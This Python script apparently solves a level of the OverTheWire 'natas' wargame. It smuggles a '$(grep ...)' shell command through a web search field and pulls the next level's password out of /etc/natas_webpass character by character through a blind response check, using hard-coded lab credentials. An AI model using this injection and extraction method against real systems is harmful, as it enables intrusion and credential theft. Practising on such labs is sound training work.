import requests
import string
import re

def naive_approach(url:str, characters):
    password = ''
    for i in range(38):
        for char in characters:
            testString = password + char
            string =  {'needle' : f'$(grep -E ^{testString} /etc/natas_webpass/natas17)'}

            print(string)

            response = requests.get(url=url, params=string, auth=("natas16","TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"))
            r = response.text
            char_match = re.search("[a-zA-Z]*African",r)
            print(char_match)
            print(not char_match)

            if not char_match:
                password += char
                print(password)
                break

    print(password)    
    return password
        

def optimized_algo(url:str, chars):
    pass_chars = []
    for char in characters:
        string =  {'needle' : f'$(grep -E .*{char} /etc/natas_webpass/natas17)'}

        response = requests.post(url=url, params=string, auth=("natas16","TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"))
        r=response.text
        char_match= re.search("[a-zA-Z]*African",r)
        print(char_match)

        if(not char_match):
            pass_chars.append(char)
            print(pass_chars)

    password = naive_approach(url, pass_chars)    
    print(password)
    return password


characters = string.ascii_letters + string.digits
print(characters)

url = 'http://natas16.natas.labs.overthewire.org/index.php'

print(optimized_algo(url, characters))
